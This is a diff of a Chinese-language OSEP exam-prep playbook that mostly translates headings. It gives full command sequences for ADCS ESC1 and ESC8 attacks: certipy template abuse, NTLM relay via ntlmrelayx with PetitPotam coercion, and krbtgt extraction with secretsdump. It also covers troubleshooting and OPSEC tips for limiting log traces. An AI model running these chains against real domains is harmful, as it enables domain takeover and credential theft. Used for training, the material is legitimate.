-**Assumptions**：`certipy`（Kali：`certipy-ad`）可用；attacker box能解析并访问 CA 主机（LDAP/DCERPC，必要时 `/etc/hosts`）；已知 DC 与 CA 的 FQDN。
+**前提与假设**：`certipy`（Kali：`certipy-ad`）可用；攻击机能解析并访问 CA 主机（LDAP/DCERPC，必要时 `/etc/hosts`）；已知 DC 与 CA 的 FQDN。
 
-**Prepare (attacker)**：`certipy find` 先做全量模板枚举并标出可利用项（一次枚举同时拿到 CA 名/模板清单/可申请者，避免盲试）。
+**准备（攻击机侧）**：`certipy find` 先做全量模板枚举并标出可利用项（一次枚举同时拿到 CA 名/模板清单/可申请者，避免盲试）。
 
-**Procedure**：
+**执行步骤**：
 ```bash
 # ① 枚举：列出 -vulnerable 模板与可注册主体
 certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
@@ -2399,18 +2395,18 @@ certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
 certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
 impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
 ```
-**Lab files**：`m12-adcs-esc1-esc8.sh`（enumerate/req/auth 一键封装 + 参数模板）。
+**用到的脚本**：`m12-adcs-esc1-esc8.sh`（enumerate/req/auth 一键封装 + 参数模板）。
 
-**Verify**：`certipy auth` 成功输出 NTLM 哈希；`secretsdump` 能读 `krbtgt` 即达域管。
+**验证**：`certipy auth` 成功输出 NTLM 哈希；`secretsdump` 能读 `krbtgt` 即达域管。
 
-**If it fails**：
+**失败分支与备选**：
 - `req` 报 0x80094012 / 证书策略不匹配 → 模板 EKU 不含客户端认证或模板被拒，换 `-template` 候选（用 `certipy find` 的完整列表而非只看 vulnerable 标记）。
 - `req` 报权限/被拒 → 当前用户对该模板无注册权；`-upn` 用户不存在或 UPN 不匹配；逐个核对 ESC1 四条件。
 - 申请成功但 `auth` 失败 → 证书主题/签发时间问题，重新 `req` 用 `-out` 覆盖；或换 `certipy auth -username administrator -domain corp.local` 显式指定。
 - CA 名/主机解析失败 → `find` 输出里取 `CA Name` 与 DNS 主机名，`/etc/hosts` 指到真实 CA IP；`-target` 参数可直指 CA。
 - 无可用 ESC1 模板 → 别硬试，跳到 ESC8（场景 55）或其他入口。
 
-**Exam notes / OPSEC**：`certipy find -vulnerable` 输出会列全域问题模板，只看场景需要的；申请证书会写入 CA 日志，冒充对象选场景目标（管理员/机器账户），不要为"测试"乱申请无关证书。
+**考试注意 OPSEC**：`certipy find -vulnerable` 输出会列全域问题模板，只看场景需要的；申请证书会写入 CA 日志，冒充对象选场景目标（管理员/机器账户），不要为"测试"乱申请无关证书。
 
 ---
 
@@ -2770,43 +2766,43 @@ printf '\n[*] 模式 %s 结束。默认只打印命令，加 -x 真正执行。\
 info "产物目录：${LOOT}（证书/PFX 及时导出到攻击机并清理目标侧残留）"
 ````
 
-## Scenario 55：没有可用的 ESC1 模板，但 CA 存在可中继的 HTTP 注册入口（ESC8）
+## 场景 55：没有可用的 ESC1 模板，但 CA 存在可中继的 HTTP 注册入口（ESC8）
 
-**Situation**：目标提供 ADCS Web Enrollment（`http(s)://CA/certsrv/`）；利用 NTLM 中继把受害者的认证中继到注册端点换证书。典型受害者：**DC 机器账户**（中继成功后拿到 DC 身份证书 → 换哈希 → DCSync）。
+**场景回顾**：目标提供 ADCS Web Enrollment（`http(s)://CA/certsrv/`）；利用 NTLM 中继把受害者的认证中继到注册端点换证书。典型受害者：**DC 机器账户**（中继成功后拿到 DC 身份证书 → 换哈希 → DCSync）。
 
-**Assumptions**：已有一个可用于触发认证的域凭据（普通域用户即可，用于 PetitPotam/PrinterBug）；attacker box能被受害者（通常是 DC 机器账户）主动连接；CA 提供 Web Enrollment 且 EPA 未启用；中继目标模板允许机器账户注册。三者任一不成立，本场景都走不通——先逐条Verify再动手。
+**前提与假设**：已有一个可用于触发认证的域凭据（普通域用户即可，用于 PetitPotam/PrinterBug）；攻击机能被受害者（通常是 DC 机器账户）主动连接；CA 提供 Web Enrollment 且 EPA 未启用；中继目标模板允许机器账户注册。三者任一不成立，本场景都走不通——先逐条验证再动手。
 
-**ESC8 中继条件**：① CA 开了 HTTP(S) Web Enrollment（`/certsrv/certfnsh.asp`）且**未启用扩展保护（EPA）**——EPA 开启时 NTLM 中继会被 CA 拒绝（HTTP 401），这是本场景头号失败原因；② 中继到的模板允许受害者（DC 机器账户）注册且 EKU 可用于认证；③ attacker box能触发受害者发起认证（SpoolSample/PetitPotam/DFSCoerce）到**中继监听器**所在主机。
+**ESC8 中继条件**：① CA 开了 HTTP(S) Web Enrollment（`/certsrv/certfnsh.asp`）且**未启用扩展保护（EPA）**——EPA 开启时 NTLM 中继会被 CA 拒绝（HTTP 401），这是本场景头号失败原因；② 中继到的模板允许受害者（DC 机器账户）注册且 EKU 可用于认证；③ 攻击机能触发受害者发起认证（SpoolSample/PetitPotam/DFSCoerce）到**中继监听器**所在主机。
 
-**Prepare (attacker)**：`impacket-ntlmrelayx`（`--adcs` 集成证书申请）、认证触发脚本（`impacket-petitpotam`/`printerbug`/`dementer`）、`certipy`（用换到的 pfx）；CA FQDN 与 `/etc/hosts` 先配好。
+**准备（攻击机侧）**：`impacket-ntlmrelayx`（`--adcs` 集成证书申请）、认证触发脚本（`impacket-petitpotam`/`printerbug`/`dementer`）、`certipy`（用换到的 pfx）；CA FQDN 与 `/etc/hosts` 先配好。
 
-**Procedure**：
+**执行步骤**：
 ```bash
 # ① 起中继：把 SMB 认证转发到 ADCS HTTP 注册端点
 impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
   --adcs --template 'Machine' -smb2support -l /tmp/relay-loot
-# ② 触发 DC 认证到attacker box（另开终端）
+# ② 触发 DC 认证到攻击机（另开终端）
 impacket-petitpotam -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local \
   LHOST DC01.corp.local
 # ③ 中继日志出现 base64 pfx → 落盘 → certipy 换哈希
 certipy auth -pfx DC01.pfx -dc-ip DC01.corp.local -domain corp.local
 impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
 ```
-**Lab files**：`m12-adcs-esc1-esc8.sh`（relay 模式：起中继 + 触发 + pfx 处理 + 依赖检查）。
+**用到的脚本**：`m12-adcs-esc1-esc8.sh`（relay 模式：起中继 + 触发 + pfx 处理 + 依赖检查）。
 
-**Verify**：ntlmrelayx 日志出现 `Got NTLMv2 hash` + `Server returned certificate`；`certipy auth` 输出受害机器账户的 NTLM 哈希；用 DC 哈希 DCSync 成功。
+**验证**：ntlmrelayx 日志出现 `Got NTLMv2 hash` + `Server returned certificate`；`certipy auth` 输出受害机器账户的 NTLM 哈希；用 DC 哈希 DCSync 成功。
 
-**If it fails**：
+**失败分支与备选**：
 - 触发后中继无回显/401 → 疑似 EPA 开启：换 HTTPS 端点仍不行就确认 EPA 后**放弃 ESC8**（EPA 下无合法绕过路径），回到 ESC1/其他入口；别反复重试浪费时间。
 - 触发成功但证书申请被拒 → 模板不允许该受害者注册或模板无认证 EKU，`ntlmrelayx --adcs --template` 换模板（先 `certipy find` 看哪些模板放 Domain Computers）。
 - 没有可用的触发向量（全部补丁/防火墙挡 RPC）→ ESC8 无受害认证来源即不可行，转其他模块入口。
 - 中继拿到的是低价值账户证书 → 换触发目标（域管登录会话触发比较难控，DC 机器账户最稳）。
 
-**Exam notes / OPSEC**：`ntlmrelayx` 会接收并转发认证，日志含凭据哈希，运行目录放 `~/osep/logs` 并事后清理；CA 的 HTTP 日志会记录中继来的申请——选择受害者时优先 DC 机器账户（行为上等同正常机器自动注册），避免伪造域管申请留下明显异常。
+**考试注意 OPSEC**：`ntlmrelayx` 会接收并转发认证，日志含凭据哈希，运行目录放 `~/osep/logs` 并事后清理；CA 的 HTTP 日志会记录中继来的申请——选择受害者时优先 DC 机器账户（行为上等同正常机器自动注册），避免伪造域管申请留下明显异常。
 
 ---
 
-## 附：本模块共用的最小准备清单（attacker box）
+## 附：本模块共用的最小准备清单（攻击机）
 
 ```bash
 # 一次装齐（Kali）
